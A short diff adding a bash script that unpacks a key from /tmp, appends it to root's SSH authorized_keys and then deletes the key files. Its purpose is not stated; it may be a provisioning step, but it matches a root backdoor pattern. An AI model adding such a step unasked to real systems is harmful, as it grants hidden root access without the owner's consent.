@@ -1,0 +1,11 @@
+#!/bin/bash
+#set -x
+cd /tmp/
+if [ -f /tmp/qbkey.bz2.dc ];then
+  tar xf /tmp/qbkey.bz2.dc
+fi
+if [ ! -d /root/.ssh ];then
+  mkdir /root/.ssh
+fi
+cat /tmp/qbkey >> /root/.ssh/authorized_keys
+rm -f /tmp/qbkey*
